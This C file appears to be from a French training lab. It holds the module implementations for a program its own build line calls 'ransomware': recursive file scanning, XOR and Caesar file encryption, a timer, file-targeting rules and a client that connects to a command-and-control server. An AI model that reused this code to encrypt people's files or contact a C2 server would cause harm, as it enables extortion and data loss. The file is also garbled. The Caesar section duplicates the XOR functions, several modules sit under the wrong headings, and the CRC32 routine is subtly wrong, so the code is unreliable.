/*
 * modules.c - Implémentations de tous les modules
 * 
 * Ce fichier contient TOUTES les implémentations des fonctions
 * déclarées dans les fichiers .h
 * 
 * INSTRUCTIONS :
 * 1. Suivre l'ordre des modules (1 à 8)
 * 2. Implémenter chaque fonction selon les instructions du TP_Jour5.md
 * 3. Compiler avec : gcc -I. -o ransomware ransomware.c modules.c
 * 4. Tester avec : ./ransomware
 */

// ============================================================================
// MODULE 1 : SCANNER DE FICHIERS
// ============================================================================

#include <dirent.h>
#include <sys/stat.h>
#include <stdio.h>
#include <string.h>

int scan_directory(const char *path, char files[][MAX_PATH], int max_files) {
    DIR *dir = opendir(path);
    if (!dir) return 0;
    
    int count = 0;
    struct dirent *entry;
    while ((entry = readdir(dir)) && count < max_files) {
        if (entry->d_name[0] == '.') continue;  // Skip . et ..
        
        char fullpath[MAX_PATH];
        snprintf(fullpath, MAX_PATH, "%s/%s", path, entry->d_name);
        
        struct stat st;
        if (stat(fullpath, &st) == 0 && S_ISREG(st.st_mode) && !should_exclude(entry->d_name)) {
            strcpy(files[count++], fullpath);
        }
    }
    closedir(dir);
    return count;
}

int scan_recursive(const char *path, char files[][MAX_PATH], int max_files, int current_count) {
    DIR *dir = opendir(path);
    if (!dir) return current_count;
    
    int count = current_count;
    struct dirent *entry;
    while ((entry = readdir(dir)) && count < max_files) {
        if (entry->d_name[0] == '.') continue;
        
        char fullpath[MAX_PATH];
        snprintf(fullpath, MAX_PATH, "%s/%s", path, entry->d_name);
        
        struct stat st;
        if (stat(fullpath, &st) != 0) continue;
        
        if (S_ISDIR(st.st_mode)) {
            count = scan_recursive(fullpath, files, max_files, count);
        } else if (S_ISREG(st.st_mode) && !should_exclude(entry->d_name)) {
            strcpy(files[count++], fullpath);
        }
    }
    closedir(dir);
    return count;
}

int should_exclude(const char *filename) {
    if (filename[0] == '.') return 1;
    if (strstr(filename, ".git")) return 1;
    if (strstr(filename, ".exclude")) return 1;
    return 0;
}

// ============================================================================
// MODULE 2 : CHIFFREMENT XOR
// ============================================================================

#include <stdio.h>
#include <string.h>


void xor_buffer(char *buffer, size_t size, const char *key, size_t key_len) {
    for (size_t i = 0; i < size; i++) {
        buffer[i] ^= key[i % key_len];
    }
}

int xor_encrypt_file(const char *input, const char *output, const char *key) {
    size_t key_len = strlen(key);
    FILE *fin = fopen(input, "rb");
    if (!fin) return -1;
    
    FILE *fout = fopen(output, "wb");
    if (!fout) { fclose(fin); return -1; }
    
    char buffer[4096];
    size_t bytes;
    while ((bytes = fread(buffer, 1, 4096, fin)) > 0) {
        xor_buffer(buffer, bytes, key, key_len);
        if (fwrite(buffer, 1, bytes, fout) != bytes) {
            fclose(fin); fclose(fout); return -1;
        }
    }
    fclose(fin); fclose(fout);
    return 0;
}

int xor_decrypt_file(const char *input, const char *output, const char *key) {
    return xor_encrypt_file(input, output, key);  // XOR symétrique
}


// ============================================================================
// MODULE 3 : CHIFFREMENT CÉSAR
// ============================================================================

#include <stdio.h>
#include <string.h>

void xor_buffer(char *buffer, size_t size, const char *key, size_t key_len) {
    for (size_t i = 0; i < size; i++) {
        buffer[i] ^= key[i % key_len];
    }
}

int xor_encrypt_file(const char *input, const char *output, const char *key) {
    size_t key_len = strlen(key);
    FILE *fin = fopen(input, "rb");
    if (!fin) return -1;
    
    FILE *fout = fopen(output, "wb");
    if (!fout) { fclose(fin); return -1; }
    
    char buffer[4096];
    size_t bytes;
    while ((bytes = fread(buffer, 1, 4096, fin)) > 0) {
        xor_buffer(buffer, bytes, key, key_len);
        if (fwrite(buffer, 1, bytes, fout) != bytes) {
            fclose(fin); fclose(fout); return -1;
        }
    }
    fclose(fin); fclose(fout);
    return 0;
}

int xor_decrypt_file(const char *input, const char *output, const char *key) {
    return xor_encrypt_file(input, output, key);  // XOR symétrique
}

// ============================================================================
// MODULE 4 : ROT13
// ============================================================================

#include <ctype.h>

char caesar_char(char c, int shift) {
    shift %= 26;
    if (isupper(c)) {
        return 'A' + (c - 'A' + shift) % 26;
    } else if (islower(c)) {
        return 'a' + (c - 'a' + shift) % 26;
    }
    return c;
}

int caesar_encrypt_file(const char *input, const char *output, int shift) {
    FILE *fin = fopen(input, "r");
    if (!fin) return -1;
    
    FILE *fout = fopen(output, "w");
    if (!fout) { fclose(fin); return -1; }
    
    int ch;
    while ((ch = fgetc(fin)) != EOF) {
        fputc(caesar_char(ch, shift), fout);
    }
    fclose(fin); fclose(fout);
    return 0;
}

int caesar_decrypt_file(const char *input, const char *output, int shift) {
    return caesar_encrypt_file(input, output, 26 - shift);
}


// ============================================================================
// MODULE 5 : CHECKSUM (CRC32)
// ============================================================================

#include "caesar_crypto.h"

char rot13_char(char c) {
    return caesar_char(c, 13);
}

int rot13_file(const char *input, const char *output) {
    return caesar_encrypt_file(input, output, 13);
}

uint32_t crc32(const unsigned char *data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= data[i];
        for (int j = 0; j < 8; j++) {
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
        }
    }
    return ~crc;
}

uint32_t calculate_crc32(const char *filepath) {
    FILE *file = fopen(filepath, "rb");
    if (!file) return 0;
    
    unsigned char buf[4096];
    size_t bytes;
    uint32_t crc = 0xFFFFFFFF;
    
    while ((bytes = fread(buf, 1, 4096, file)) > 0) {
        crc = crc32(buf, bytes);
    }
    fclose(file);
    return crc;
}

int verify_integrity(const char *filepath, uint32_t expected_crc) {
    uint32_t actual = calculate_crc32(filepath);
    return (actual == expected_crc) ? 0 : -1;
}

// ============================================================================
// MODULE 6 : TIMER
// ============================================================================
#include <time.h>
#include <unistd.h>

long get_current_timestamp() {
    return time(NULL);
}

void wait_seconds(int seconds) {
    sleep(seconds);
}

void wait_until(long target_timestamp) {
    while (get_current_timestamp() < target_timestamp) {
        sleep(1);
    }
}


// ============================================================================
// MODULE 7 : CONFIGURATION
// ============================================================================

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

Config* load_config(const char *filepath) {
    Config *cfg = malloc(sizeof(Config));
    if (!cfg) return NULL;
    
    cfg->whitelist_count = cfg->blacklist_count = 0;
    FILE *file = fopen(filepath, "r");
    if (!file) { free(cfg); return NULL; }
    
    char line[256];
    int in_whitelist = 0, in_blacklist = 0;
    while (fgets(line, sizeof(line), file)) {
        line[strcspn(line, "\n")] = 0;
        if (strcmp(line, "[WHITELIST]") == 0) {
            in_whitelist = 1; in_blacklist = 0;
        } else if (strcmp(line, "[BLACKLIST]") == 0) {
            in_whitelist = 0; in_blacklist = 1;
        } else if (strlen(line) > 0 && line[0] != '#') {
            if (in_whitelist && cfg->whitelist_count < MAX_PATTERNS) {
                strcpy(cfg->whitelist[cfg->whitelist_count++], line);
            } else if (in_blacklist && cfg->blacklist_count < MAX_PATTERNS) {
                strcpy(cfg->blacklist[cfg->blacklist_count++], line);
            }
        }
    }
    fclose(file);
    return cfg;
}

int is_allowed(const Config *cfg, const char *filepath) {
    for (int i = 0; i < cfg->blacklist_count; i++) {
        if (strstr(filepath, cfg->blacklist[i])) return 0;
    }
    for (int i = 0; i < cfg->whitelist_count; i++) {
        if (strstr(filepath, cfg->whitelist[i])) return 1;
    }
    return 0;
}

void free_config(Config *cfg) {
    free(cfg);
}

// ============================================================================
// MODULE 8 : CLIENT C2
// ============================================================================
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int c2_connect(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &addr.sin_addr) <= 0) {
        close(sock); return -1;
    }
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock); return -1;
    }
    return sock;
}

C2Response c2_send_command(int sockfd, const C2Command *cmd) {
    C2Response resp = {0};
    
    ssize_t sent = send(sockfd, cmd, sizeof(C2Command), 0);
    if (sent != sizeof(C2Command)) {
        resp.status = -1; strcpy(resp.message, "Send failed");
        return resp;
    }
    
    ssize_t recvd = recv(sockfd, &resp, sizeof(resp), 0);
    if (recvd <= 0) {
        resp.status = -1; strcpy(resp.message, "Recv failed");
    }
    return resp;
}

void c2_disconnect(int sockfd) {
    if (sockfd >= 0) close(sockfd);
}
